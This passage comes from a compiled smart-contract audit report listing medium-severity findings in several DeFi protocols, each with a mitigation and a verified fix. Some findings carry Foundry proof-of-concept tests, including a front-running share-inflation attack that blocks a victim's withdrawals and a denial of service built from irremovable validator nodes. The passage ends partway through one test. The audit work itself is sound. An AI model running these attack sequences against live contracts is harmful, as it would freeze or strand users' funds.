In this case, execution will revert in `Math512Lib::div512by256` with `DivisorZero()` due to division by zero; however, the actual solution should be $$p_\star = (\hat Y+y) / 2L$$ since the quadratic term in $$A \cdot(\sqrt{p_\star})^2 + 2L\cdot\sqrt{p_\star} - (\hat Y+y) = 0$$ disappears and the equation becomes linear in $$\sqrt{p_\star}$$.

**Impact:** Swaps will revert when $$A = B + \hat X - x = 0$$.

**Recommended Mitigation:** Handle this edge case separately.

**Sorella Labs:** Fixed in commit [500ef96](https://github.com/SorellaLabs/l2-angstrom/commit/500ef9660a20bab0187a9db73078fdbf8a1bebf8).

**Cyfrin:** Verified. The $$A = 0$$ case is now handled separately.

\clearpage

## [M-21] Unused custom error should removed if not required
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
**Description:** `AngstromL2` defines the `NegationOverflow()` custom error; however, it is not currently used and so should be removed unless actually required.

**Sorella Labs:** Fixed in commit [4702d84](https://github.com/SorellaLabs/l2-angstrom/commit/4702d84d6ea9c6346467be261cedfca02f1e0d36).

**Cyfrin:** Verified.

## [M-22] `liquidityProviderWallet` is not set during initialization
- Severity: `Medium`
- Source report: `bridge.md`

### Detailed Content (from source)
**Description:** In `AllowanceLiquidityProvider::initialize`, one of the key properties, `liquidityProviderWallet`, is not initialized. This property is declared as a public variable but never set during contract initialization. Since the contract does not enforce or set this value at any point in `initialize`, any functionality that depends on `liquidityProviderWallet` may behave incorrectly.

```solidity
address public liquidityProviderWallet;
```

**Impact:** Until `liquidityProviderWallet` is set, functions like `_availableLiquidity()` and `supplyTo()` will rely on the default address(0) value. This could result in:

- Returning an incorrect liquidity value (typically zero).

- Causing failed or unexpected behavior during redemptions, since transferFrom(address(0), ...) will fail.

**Recommended Mitigation:** Update the `initialize` function to accept a `_liquidityProviderWallet` parameter and ensure it is validated and assigned:

```solidity
function initialize(
    address _liquidityToken,
    address _recipient,
    address _securitizeOffRamp,
    address _liquidityProviderWallet
) public onlyProxy initializer {
    if (_recipient == address(0)) revert NonZeroAddressError();
    if (_liquidityToken == address(0)) revert NonZeroAddressError();
    if (_securitizeOffRamp == address(0)) revert NonZeroAddressError();
    if (_liquidityProviderWallet == address(0)) revert NonZeroAddressError();

    __BaseContract_init();
    recipient = _recipient;
    liquidityToken = IERC20(_liquidityToken);
    securitizeOffRamp = ISecuritizeOffRamp(_securitizeOffRamp);
    liquidityProviderWallet = _liquidityProviderWallet;
}
```

This ensures that `liquidityProviderWallet` is set once during contract initialization and cannot be accidentally or maliciously left uninitialized.

**Securitize:** Fixed in commit [ab08ae](https://github.com/securitize-io/bc-on-off-ramp-sc/commit/ab08aea2c8c67ca311dcf46cd747621f84a14505).

**Cyfrin:** Verified.

## [M-23] Don't use `transfer` to send ETH
- Severity: `Medium`
- Source report: `cctpv2.md`

### Detailed Content (from source)
**Description:** Using `transfer` to send ETH hasn't been recommended since the Istanbul hard fork in December 2019 which increased the gas cost of some operations; `transfer` hard-codes gas to 2300 which can cause receiving functions to revert hence is not future-proof.

The [recommended way to send eth](https://www.securitize-io.io/glossary/sending-ether-transfer-send-call-solidity-code-example) is to use `call` and Solady has an optimized way of doing this in [SafeTransferLib::safeTransferETH](https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.sol#L95-L103).

`transfer` also may not work as expected on L2s, for example there was this [incident](https://thedefiant.io/news/defi/zksync-rescues-gemholic) which resulted in 921 ETH being stuck on zksync Era due to the smart contract using transfer to send eth, though eventually zksync developed a [solution](https://www.theblock.co/post/225364/zksync-unfreeze-millions-stuck) to rescue the stuck eth.

Affected code in `USDCBridgeV2::withdrawETH`:
```solidity
bridge/USDCBridgeV2.sol
202:        _to.transfer(amount);
```

**Securitize:** Fixed in commit [2b18646](https://github.com/securitize-io/bc-securitize-bridge-sc/commit/2b18646e6344fcebe4f32107cd56812877ddadea).

**Cyfrin:** Verified.

## [M-24] `Tranche::burnSharesAsFee` can be used to manipulate the exchange rate to cause withdrawals to revert for legitimate users
- Severity: `Medium`
- Source report: `cooldown.md`

### Detailed Content (from source)
**Description:** `Tranche::burnSharesAsFee` is a new function meant to allow charging fees in the form of burning shares and distributing the corresponding NAV for those shares among the Tranche and Reserve.

The problem is that this function can be leveraged to inflate the exchange rate before a first legitimate deposit.
This will set the system in an unexpected state where the Tranche_NAV will be > 0, but its totalSupply will be 0, allowing the attacker to mint 1 wei of a share, effectively inflating the exchange rate.

**Impact:** Assets will get stuck on the Strategy contract.

**Proof of Concept:** The next attack demonstrates how the exchange rate can be manipulated via the `Tranche::burnSharesAsFee` function:
1. Attacker frontruns a legitimate deposit and mints 1 full share on the Tranche.
2. Attacker calls ``Tranche::burnSharesAsFee`` to burn the full share.
- At this point, `totalSupply` will be 0, whilst `Tranche_NAV` will be > 0 because of the `retentionBps`
3. The attacker mints 1 wei of a share.
- The exchange rate will be set as: 1 wei of Shares for all the current TrancheNav
5. The legitimate first deposit is processed, and the legitimate user receives a couple of weis of shares, way below the `MIN_SHARES`.
6. The legitimate user attempts to withdraw his deposit, but the withdrawal reverts because the total shares on the tranche are below the `MIN_SHARES`.

Add the PoC on the test/PoC/Cyfrin folder:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IErrors } from "../../../contracts/tranches/interfaces/IErrors.sol";

contract BurnSharesAsFees_ToManipulateExchangeRate is CDOTest {
    function test_PoC_burnSharesAsFees_ToManipulateExchangeRate() public {
        // Set retentionBps at 80% for both tranches
        accounting.setFeeRetentionBps(0.8e18, 0.8e18);

        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");

        // Same value as in the Tranche contract
        uint256 MIN_SHARES = 0.1 ether;

//////// initialize sUSDe exchange rate and mint USDe to bob and alice ////////
        USDe.mint(bob, 1000 ether);
        vm.startPrank(bob);
            USDe.approve(address(sUSDe), type(uint256).max);
            sUSDe.deposit(1000 ether, bob);
        vm.stopPrank();

        uint256 initialDeposit = 1000 ether;
        USDe.mint(alice, initialDeposit);
        USDe.mint(bob, initialDeposit);
//////////////////////////////////////////////////////////////////////////////

//////// alice manipulates exchange rate on JRTranche via burning shares as feees ////////
        vm.startPrank(alice);
            USDe.approve(address(jrtVault), type(uint256).max);
            jrtVault.deposit(1e18, alice);

            uint256 aliceMaxRedeem = jrtVault.maxRedeem(alice);
            jrtVault.burnSharesAsFee(aliceMaxRedeem, alice);

            assertEq(jrtVault.totalSupply(), 0);
            assertGt(jrtVault.totalAssets(), 0);

            jrtVault.mint(1, alice);
            assertEq(jrtVault.totalSupply(), 1);

            uint256 exchangeRate = jrtVault.convertToAssets(1);
            assertGt(exchangeRate, 0.5e18);
        vm.stopPrank();
//////////////////////////////////////////////////////////////////////////////

//////// bob deposits and loses his assets because of the manipulated exchange rate ////////
        USDe.mint(bob, 1_000_000e18);
        vm.startPrank(bob);
            USDe.approve(address(jrtVault), type(uint256).max);
            //Step 2 => Now Bob deposits 1million USDe into the Tranche
            jrtVault.deposit(1_000_000e18, bob);

            //Because of the manipulated exchange rate, the total minted TrancheShares for such a big deposits won't even reach the MIN_SHARES
            assertLt(jrtVault.totalSupply(), MIN_SHARES);

            //Step 3 => Bob attempts to make a withdrawal, but the withdrawal reverts because the total shares on the Tranche fall below MIN_SHARES
            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(10_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(100e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(90_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(1e18, bob, bob);
        vm.stopPrank();
    }
//////////////////////////////////////////////////////////////////////////////
}
```

**Recommended Mitigation:** When burning shares as fees, consider validating that the remaining shares are above the `MIN_SHARES`
- Call `_onAfterWithdrawalChecks` at the end of the execution on `Tranche::burnSharesAsFee`.

**Strata:** Fixed in commit [ad26a5e](https://github.com/Strata-Money/contracts-tranches/commit/ad26a5eeb865bf01caf564484d4ff222ee8d7228)

**Cyfrin:** Verified. `Tranche::_onAfterWithdrawalChecks` is called to prevent burning shares below the `MIN_SHARES`

## [M-25] Accumulative reward setting to prevent overwrite and support incremental updates
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `Rewards::setRewardsAmountForEpochs` function allows an authorized distributor to set a fixed reward amount for a specific number of future epochs. This is typically called to define reward schedules—for example, assigning 20 tokens per epoch from epoch 1 to 5.

However, the current implementation **does not check whether rewards have already been set** for the target epochs. As a result, calling this function again for the same epochs **silently overrides the existing rewards**, leading to unintended consequences:

1. **Previously allocated rewards are overwritten.**
2. **New rewards are written to storage, but tokens from the previous call remain locked in the contract**, as there is no mechanism to refund or reallocate them.

Assume the following:

1. Distributor calls `setRewardsAmountForEpochs(1, 1, USDC, 100)`
   → Epoch 1 is allocated 100 USDC
   → 100 USDC is transferred into the contract

2. Later, a second call is made:
   `setRewardsAmountForEpochs(1, 1, USDC, 50)`
   → Epoch 1 is now reallocated to 50 USDC
   → **Original 100 USDC still sits in the contract**, but only 50 will be distributed
   → The difference (100 USDC) becomes stuck

**Impact:** **Loss of Funds:** Overwritten rewards are effectively stranded in the contract with no mechanism to recover or redistribute them.
**Unexpected Behavior for Distributors:** Calling `setRewardsAmountForEpochs` twice for the same epoch silently overrides the original intent without warning.

**Proof of Concept:** Add this test to `Rewards`:

```solidity
function test_setRewardsAmountForEpochs() public {
        uint256 rewardsAmount = 1_000_000 * 10 ** 18;
        ERC20Mock rewardsToken1 = new ERC20Mock();
        rewardsToken1.mint(REWARDS_DISTRIBUTOR_ROLE, 2 * 1_000_000 * 10 ** 18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken1.approve(address(rewards), 2 * 1_000_000 * 10 ** 18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(5, 1, address(rewardsToken1), rewardsAmount);
        assertEq(rewards.getRewardsAmountPerTokenFromEpoch(5, address(rewardsToken1)), rewardsAmount - Math.mulDiv(rewardsAmount, 1000, 10000));
        assertEq(rewardsToken1.balanceOf(address(rewards)), rewardsAmount);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.setRewardsAmountForEpochs(5, 1, address(rewardsToken1), rewardsAmount);
        assertEq(rewardsToken1.balanceOf(address(rewards)), rewardsAmount * 2 );

        assertEq(rewards.getRewardsAmountPerTokenFromEpoch(5, address(rewardsToken1)), (rewardsAmount - Math.mulDiv(rewardsAmount, 1000, 10000)) * 2);
    }
```

 **Recommended Mitigation:**

Add a **guard clause** in the `setRewardsAmountForEpochs` function to **prevent overwriting rewards** for epochs that already have a value set:

```diff
for (uint48 i = 0; i < numberOfEpochs; i++) {

-    rewardsAmountPerTokenFromEpoch[startEpoch + i].set(rewardsToken, rewardsAmount);
+    uint256 existingAmount = rewardsAmountPerTokenFromEpoch[targetEpoch].get(rewardsToken);
+   rewardsAmountPerTokenFromEpoch[targetEpoch].set(rewardsToken, existingAmount + rewardsAmount);
}
```

**Suzaku:**
Fixed in commit [a5c4913](https://github.com/suzaku-network/suzaku-core/pull/155/commits/a5c4913f9f73aa9f87e0026f4fac1cade95b8e64).

**Cyfrin:** Verified.

## [M-26] Disabled operators can register new validator nodes
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `AvalancheL1Middleware::addNode` function allows an operator to register a new node if msg.sender is included in the operators list. However, there is a potential issue with how the operator lifecycle is handled: before an operator is permanently removed via removeOperator, it must first be placed into a "disabled" state using disableOperator.

The problem arises because the addNode function does not check whether the operator is in a disabled state—it only checks for existence in the operators set. As a result, a disabled operator  can still call addNode, even though operationally they are expected to be inactive during this period.

**Impact:** A disabled operator can continue to register new validator nodes via addNode, despite being in a state that should preclude them from performing such actions.

**Recommended Mitigation:** Update the addNode function to also check whether the operator is enabled, not just registered:

```diff
(, uint48 disabledTime) = operators.getTimes(operator);
+if (!operators.contains(operator) || disabledTime > 0 ) {
-if (!operators.contains(operator)) {
    revert AvalancheL1Middleware__OperatorNotActive(operator);
}
```
**Suzaku:**
Fixed in commit [0e0d4ae](https://github.com/suzaku-network/suzaku-core/pull/155/commits/0e0d4aee6394b8acbda391e107db8fb9f49f7102).

**Cyfrin:** Verified.

## [M-27] DoS on stake accounting functions by bloating `operatorNodesArray` with irremovable nodes
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** When an operator removes a node the intended flow is:

1. `removeNode()` (middleware)
2. `calcAndCacheNodeStakeForAllOperators()` (called immediately or by the `updateGlobalNodeStakeOncePerEpoch` modifier)
   * branch ✔ runs:
     ```solidity
     if (nodePendingRemoval[valID] && …) {
         _removeNodeFromArray(operator,nodeId);
         nodePendingRemoval[valID] = false;
     }
     ```
   * the node is popped from `operatorNodesArray` and its `nodePendingRemoval` flag is cleared
3. `completeValidatorRemoval()` after the P-Chain confirmation arrives (warp message)

If steps 1 and 3 both happen **inside the same epoch** *after* that epoch’s call to
`calcAndCacheNodeStakeForAllOperators()`, we enter an inconsistent state:

* `completeValidatorRemoval()` executes `_completeEndValidation()` in **BalancerValidatorManager**, which deletes the mapping entry in `._registeredValidators`:
  ```solidity
  delete $._registeredValidators[validator.nodeID];
  ```
* From now on, every call in the next epoch to
  ```solidity
  bytes32 valID =
      balancerValidatorManager.registeredValidators(abi.encodePacked(uint160(uint256(nodeId))));
  ```
  returns `bytes32(0)`.

During `_calcAndCacheNodeStakeForOperatorAtEpoch()` (epoch E + 1):

* `valID == bytes32(0)` so **both** `nodePendingRemoval[valID]` and `nodePendingUpdate[valID]`
  are `false`.
* The special removal branch is skipped, therefore
  `operatorNodesArray` **still contains the stale `nodeId`** forever.
* No other house-keeping step ever removes it, because the sentinel `valID`
  can no longer be reconstructed.

The node is now impossible to remove or update, Operators can repeat the sequence to add *unlimited* ghost nodes and inflate `operatorNodesArray`. All O(n) loops over that array (e.g. `forceUpdateNodes`, `_calcAndCacheNodeStakeForAllOperators`, many view helpers) grow without bound, eventually exhausting block gas or causing permanent **DoS** for that operator and, indirectly, for protocol-wide maintenance functions.


**Impact:** Oversized arrays make epoch-maintenance and stake-rebalance functions revert on out-of-gas. Stake updates, slashing, reward distributions and emergency withdrawals depending on them can be frozen.

**Proof of Concept:**
```solidity
// ─────────────────────────────────────────────────────────────────────────────
// PoC – “Phantom” / Irremovable Node
// Shows how a node can be removed *logically* on the P-Chain yet remain stuck
// inside `operatorNodesArray`, blowing up storage & breaking future logic.
// ─────────────────────────────────────────────────────────────────────────────
import {AvalancheL1MiddlewareTest} from "./AvalancheL1MiddlewareTest.t.sol";
import {PChainOwner}              from "@avalabs/teleporter/validator-manager/interfaces/IValidatorManager.sol";
import {StakeConversion}          from "src/contracts/middleware/libraries/StakeConversion.sol";
import {console2}                 from "forge-std/console2.sol";

contract PoCIrremovableNode is AvalancheL1MiddlewareTest {

    /// Demonstrates *expected* vs *buggy* behaviour side-by-side
    function test_PoCIrremovableNode() public {

        // ─────────────────────────────────────────────────────────────────────
        // 1)  NORMAL FLOW – node can be removed
        // ─────────────────────────────────────────────────────────────────────
        console2.log("=== NORMAL FLOW ===");
        vm.startPrank(alice);

        // Create a fresh nodeId so it is unique for Alice
        bytes32 nodeId = keccak256(abi.encodePacked(alice, "node-A", block.timestamp));

        console2.log("Registering nodeA");
        middleware.addNode(
            nodeId,
            hex"ABABABAB",                        // dummy BLS key
            uint64(block.timestamp + 2 days),     // expiry
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            100_000_000_000_000                   // stake
        );

        // Complete registration on the mock validator manager
        uint32 regMsgIdx = mockValidatorManager.nextMessageIndex() - 1;
        middleware.completeValidatorRegistration(alice, nodeId, regMsgIdx);
        console2.log("nodeA registered");

        // Length should now be 1
        assertEq(middleware.getOperatorNodesLength(alice), 1);

        // Initiate removal
        console2.log("Removing nodeA");
        middleware.removeNode(nodeId);

        vm.stopPrank();

        // Advance 1 epoch so stake caches roll over
        _calcAndWarpOneEpoch();

        // Confirm removal from P-Chain and complete it on L1
        uint32 rmMsgIdx = mockValidatorManager.nextMessageIndex() - 1;
        vm.prank(alice);
        middleware.completeValidatorRemoval(rmMsgIdx);
        console2.log("nodeA removal completed");

        // Now node array should be empty
        assertEq(middleware.getOperatorNodesLength(alice), 0);
        console2.log("NORMAL FLOW success: array length = 0\n");

        // ─────────────────────────────────────────────────────────────────────
        // 2)  BUGGY FLOW – removal inside same epoch ⇒ phantom entry
        // ─────────────────────────────────────────────────────────────────────
        console2.log("=== BUGGY FLOW (same epoch) ===");
        vm.startPrank(alice);

        // Re-use *same* nodeId to simulate quick re-registration
        console2.log("Registering nodeA in the SAME epoch");
        middleware.addNode(
            nodeId,                               // same id!
            hex"ABABABAB",
            uint64(block.timestamp + 2 days),
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            PChainOwner({threshold: 1, addresses: new address[](0)}),
            100_000_000_000_000
        );
        uint32 regMsgIdx2 = mockValidatorManager.nextMessageIndex() - 1;
        middleware.completeValidatorRegistration(alice, nodeId, regMsgIdx2);
        console2.log("nodeA (second time) registered");

        // Expect length == 1 again
        assertEq(middleware.getOperatorNodesLength(alice), 1);

        // Remove immediately
        console2.log("Immediately removing nodeA again");
        middleware.removeNode(nodeId);

        // Complete removal *still inside the same epoch* (simulating fast warp msg)
        uint32 rmMsgIdx2 = mockValidatorManager.nextMessageIndex() - 1;
        middleware.completeValidatorRemoval(rmMsgIdx2);
        console2.log("nodeA (second time) removal completed");

        vm.stopPrank();

        // Advance to next epoch
        _calcAndWarpOneEpoch();

        // BUG: array length is STILL 1 → phantom node stuck forever
        uint256 lenAfter = middleware.getOperatorNodesLength(alice);
        assertEq(lenAfter, 1, "Phantom node should remain");

        console2.log("BUGGY FLOW reproduced: node is irremovable.");
    }
}
```

**Output**
```bash
Ran 1 test for test/middleware/PoCIrremovableNode.t.sol:PoCIrremovableNode
[PASS] test_PoCIrremovableNode() (gas: 1138657)
Logs:
  === NORMAL FLOW ===
  Registering nodeA
  nodeA registered
  Removing nodeA
  nodeA removal completed
  NORMAL FLOW success: array length = 0

  === BUGGY FLOW (same epoch) ===
  Registering nodeA in the SAME epoch
  nodeA (second time) registered
  Immediately removing nodeA again
  nodeA (second time) removal completed
  BUGGY FLOW reproduced: node is irremovable.

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.31ms (789.96µs CPU time)

Ran 1 test suite in 158.79ms (4.31ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
Before running the PoC make sure to add the following line to the `MockBalancerValidatorManager::completeEndValidation` since it exists in the `BalancerValidatorManager` implementation:
```diff
    function completeEndValidation(
        uint32 messageIndex
    ) external override {
        ...
        ...
        // Clean up
        delete pendingRegistrationMessages[messageIndex];
        delete pendingTermination[validationID];
+       delete _registeredValidators[validator.nodeID];
    }
```
- [completeValidatorRemoval](https://github.com/ava-labs/icm-contracts/blob/bd61626c67a7736119c6571776b85db6ce105992/contracts/validator-manager/ValidatorManager.sol#L604-L605)



**Recommended Mitigation:** **Track pending removals by `nodeId`, not by `validationID`**, or store an auxiliary mapping `nodeId ⇒ validationID` before deletion so the middleware can still correlate them after `_registeredValidators` is cleared.

**Suzaku:**
Fixed in commit [d4d2df7](https://github.com/suzaku-network/suzaku-core/pull/155/commits/d4d2df784273bc8d4de51e8aabc6aaf06cea6203).

**Cyfrin:** Verified.


\clearpage

## [M-28] Potential underflow in slashing logic
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `VaultTokenized::onSlash` uses a cascading slashing logic when handling scenarios where the calculated `withdrawalsSlashed` exceeds available `withdrawals_`. In such cases, the excess amount is added to `nextWithdrawalsSlashed` without checking if `nextWithdrawals` can absorb this additional slashing amount.

In the code snippet below

```solidity
// In the slashing logic for the previous epoch case
if (withdrawals_ < withdrawalsSlashed) {
    nextWithdrawalsSlashed += withdrawalsSlashed - withdrawals_;
    withdrawalsSlashed = withdrawals_;
}

// Later, this could underflow if nextWithdrawalsSlashed > nextWithdrawals
vs.withdrawals[currentEpoch_ + 1] = nextWithdrawals - nextWithdrawalsSlashed; //@audit this is adjusted without checking if nextWithdrawalsSlashed <= nextWithdrawals
```
Due to rounding in integer arithmetic and the fact that `withdrawalsSlashed` is calculated as a remainder `(slashedAmount - activeSlashed - nextWithdrawalsSlashed)`, it's possible for `withdrawalsSlashed` to exceed `withdrawals_` in normal proportional distribution. This causes excess slashing to cascade to `nextWithdrawalsSlashed`.

If `nextWithdrawals` is zero or less than the adjusted `nextWithdrawalsSlashed`, the operation `nextWithdrawals - nextWithdrawalsSlashed` would underflow, causing the transaction to revert, effectively creating a Denial of Service (DoS) in the slashing mechanism.

**Impact:** The slashing transaction will revert, preventing any slashing from occurring in affected scenarios. In certain specific scenarios, malicious actors can engineer this scenario to prevent slashing.

The likelihood of this occurring naturally increases when:

- Future withdrawals are minimal or zero
- Slashing amounts are close to total available stake
- Rounding effects in integer arithmetic become significant

**Proof of Concept:** Consider following scenario:

```text
activeStake_ = 99
withdrawals_ = 3
nextWithdrawals = 0
slashableStake = 102
slashedAmount = 102

Calculation with rounding down:

activeSlashed = floor(102 * 99 / 102) = 98 (rounding down from 98.97)
nextWithdrawalsSlashed = 0
withdrawalsSlashed = 102 - 98 - 0 = 4
withdrawalsSlashed (4) > withdrawals_ (3)

The final operation nextWithdrawals (0) - nextWithdrawalsSlashed (1) causes underflow.
```

**Recommended Mitigation:** Consider adding an explicit check to handle the case where `nextWithdrawalsSlashed` exceeds `nextWithdrawals`. This change will prevent the underflow condition and ensure the slashing mechanism remains operational under all circumstances.


**Suzaku:**
Fixed in commit [98bd130](https://github.com/suzaku-network/suzaku-core/pull/155/commits/98bd13087f37a85a1e563b9ca8e12c4fab090615).

**Cyfrin:** Verified.

## [M-29] Redundant overflow checks in safe arithmetic operations
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** `Solidity 0.8.25` includes built-in overflow checks for arithmetic operations, which add ~20-30 gas per operation. In `UptimeTracker::computeValidatorUptime`, operations like loop increments (i++) and additions (lastUptimeEpoch + i) are guaranteed not to overflow due to the use of uint48 and controlled inputs.

**Recommended Mitigation:** Use unchecked blocks for safe arithmetic operations:
```solidity

for (uint48 i = 0; i < elapsedEpochs;) {
    uint48 epoch;
    unchecked {
        epoch = lastUptimeEpoch + i;
        i++;
    }
    // ...
}
```

**Suzaku:**
Fixed in commit [2fb0daf](https://github.com/suzaku-network/suzaku-core/commit/2fb0dafd684eeaf11b177602c5047d1e6ce2d715).

**Cyfrin:** Verified.

\clearpage

## [M-30] Rewards distribution DoS due to uncached secondary asset classes
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The rewards calculation directly accesses the totalStakeCache mapping instead of using the getTotalStake() function with proper fallback logic:

```solidity
function _calculateOperatorShare(uint48 epoch, address operator) internal {
  // code..

  uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
  for (uint256 i = 0; i < assetClasses.length; i++) {
       uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]); //@audit directly accesses totalStakeCache
  }
}
```
Only specific operations trigger caching for secondary asset classes:
```solidity
// @audit following only cache PRIMARY_ASSET_CLASS (asset class 1)
addNode(...) updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS)
forceUpdateNodes(...) updateStakeCache(getCurrentEpoch(), PRIMARY_ASSET_CLASS)

// @audit only caches the specific asset class being slashed
slash(epoch, operator, amount, assetClassId) updateStakeCache(epoch, assetClassId)
```
Secondary asset classes (2, 3, etc.) are only cached when:

- Slashing occurs for that specific asset class (infrequent)
- Manual calcAndCacheStakes() calls (requires intervention)

As a result, when rewards distributor calls `distributeRewards`, for the specific asset class ID with uncached stake, `_calculateOperatorShare` leads to a division by zero error.

**Impact:** Rewards distribution fails for affected epochs. It is worthwhile to note that DoS is temporary - manual intervention by calling `calcAndCacheStakes` for specific asset class ID's can fix the DoS error.

**Proof of Concept:** Add the following test to `RewardsTest.t.sol`

```solidity
function test_RewardsDistributionDOS_With_UncachedSecondaryAssetClasses() public {
    uint48 epoch = 1;
    uint256 uptime = 4 hours;

    // Setup stakes for operators normally
    _setupStakes(epoch, uptime);

    // Set totalStakeCache to 0 for secondary asset classes to simulate uncached state
    middleware.setTotalStakeCache(epoch, 2, 0); // Secondary asset class 2
    middleware.setTotalStakeCache(epoch, 3, 0); // Secondary asset class 3

    // Keep primary asset class cached (this would be cached by addNode/forceUpdateNodes)
    middleware.setTotalStakeCache(epoch, 1, 100000); // This stays cached


    // Move to epoch where distribution is allowed (must be at least 2 epochs ahead)
    vm.warp((epoch + 3) * middleware.EPOCH_DURATION());

    // Attempt to distribute rewards - this should fail due to division by zero
    // when _calculateOperatorShare tries to calculate rewards for uncached secondary asset classes
    vm.expectRevert(); // This should revert due to division by zero in share calculation

    vm.prank(REWARDS_DISTRIBUTOR_ROLE);
    rewards.distributeRewards(epoch, 3);
}

```

**Recommended Mitigation:** Consider checking and caching stake for assetIds if it doesn't exist.

```diff solidity
function _calculateOperatorShare(uint48 epoch, address operator) internal {
  // code..

  uint96[] memory assetClasses = l1Middleware.getAssetClassIds();
  for (uint256 i = 0; i < assetClasses.length; i++) {
++       uint256 totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
++       if (totalStake == 0) {
++            l1Middleware.calcAndCacheStakes(epoch, assetClasses[i]);
++             totalStake = l1Middleware.totalStakeCache(epoch, assetClasses[i]);
++       }
       // code
  }
}
```

**Suzaku:**
Fixed in commit [f76d1f4](https://github.com/suzaku-network/suzaku-core/pull/155/commits/f76d1f44208e9e882047713a8c49d16cccc69e36).

**Cyfrin:** Verified.

## [M-31] Rewards system DOS due to unchecked asset class share and fee allocations
- Severity: `Medium`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The REWARDS_MANAGER_ROLE can set asset class reward shares without validating that the total allocation does not exceed 100%. This enables over-allocation of rewards, leading to potential insolvency and denial of service for later claimers.

A similar issue exists when assigning fee% for protocol, operator and curator. When setting each of these fees, current logic only checks that fee is less than 100% but fails to check that the cumulative fees is less than 100%.

In this issue, we focus on the asset class share issue as that is more likely to occur, specially when there are multiple assets at play.

`Rewards::setRewardsShareForAssetClass()` function lacks validation to ensure total asset class shares do not exceed 100%:

```solidity
function setRewardsShareForAssetClass(uint96 assetClass, uint16 share) external onlyRole(REWARDS_MANAGER_ROLE) {
    if (share > BASIS_POINTS_DENOMINATOR) revert InvalidShare(share);
    rewardsSharePerAssetClass[assetClass] = share;  // @audit No total validation
    emit RewardsShareUpdated(assetClass, share);
}
```
`_calculateOperatorShare()` function sums these shares without bounds checking resulting in potentially inflated numbers:

```solidity
for (uint256 i = 0; i < assetClasses.length; i++) {
    uint16 assetClassShare = rewardsSharePerAssetClass[assetClasses[i]];
    uint256 shareForClass = Math.mulDiv(operatorStake * BASIS_POINTS_DENOMINATOR / totalStake, assetClassShare, BASIS_POINTS_DENOMINATOR);
    totalShare += shareForClass; // @audit Can exceed 100%
}
```
Similarly, `claimOperatorFee` just assumes that the `operatorShare` is less than 100% which will only be true if the reward share validation exists.

```solidity
 function claimOperatorFee(address rewardsToken, address recipient) external {
   // code..

    for (uint48 epoch = lastClaimedEpoch + 1; epoch < currentEpoch; epoch++) {
            uint256 operatorShare = operatorShares[epoch][msg.sender];
            if (operatorShare == 0) continue;

            // get rewards amount per token for epoch
            uint256 rewardsAmount = rewardsAmountPerTokenFromEpoch[epoch].get(rewardsToken);
            if (rewardsAmount == 0) continue;

            uint256 operatorRewards = Math.mulDiv(rewardsAmount, operatorShare, BASIS_POINTS_DENOMINATOR); //@audit this can exceed reward amount - no check here
            totalRewards += operatorRewards;
        }

}
```


**Impact:**
- Over-allocation: Admin sets asset class shares totaling > 100%
- In extreme case, can cause insolvency for the last batch of claimers. All rewards were claimed by earlier users leaving nothing left to claim for later user.

**Proof of Concept:** Run the test in `RewardsTest.t.sol`. Note that, to demonstrate this test, following changes were made to `setup()`:

```solidity

        // mint only 100000 tokens instead of 1 million
        rewardsToken = new ERC20Mock();
        rewardsToken.mint(REWARDS_DISTRIBUTOR_ROLE, 100_000 * 10 ** 18);
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewardsToken.approve(address(rewards), 100_000 * 10 ** 18);

        // disribute only to 1 epoch instead of 10
       console2.log("Setting up rewards distribution per epoch...");
        uint48 startEpoch = 1;
        uint48 numberOfEpochs = 1;
        uint256 rewardsAmount = 100_000 * 10 ** 18;

```

```solidity
    function test_DOS_RewardShareSumGreaterThan100Pct() public {
        console2.log("=== TEST BEGINS ===");


        // 1: Modify fee structure to make operators get 100% of rewards
        // this is done just to demonstrate insolvency
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.updateProtocolFee(0);     // 0% - no protocol fee
        rewards.updateOperatorFee(10000); // 100% - operators get everything
        rewards.updateCuratorFee(0);      // 0% - no curator fee
        vm.stopPrank();

        // 2: Set asset class shares > 100%
        vm.startPrank(REWARDS_MANAGER_ROLE);
        rewards.setRewardsShareForAssetClass(1, 8000); // 80%
        rewards.setRewardsShareForAssetClass(2, 7000); // 70%
        rewards.setRewardsShareForAssetClass(3, 5000); // 50%
        // Total: 200%
        vm.stopPrank();

        // 3: Use existing working setup for stakes
        uint48 epoch = 1;
        _setupStakes(epoch, 4 hours);

        // 4: Distribute rewards
        vm.warp((epoch + 3) * middleware.EPOCH_DURATION());
        vm.prank(REWARDS_DISTRIBUTOR_ROLE);
        rewards.distributeRewards(epoch, 10);

        //5: Check operator shares (should be inflated due to 200% asset class shares)
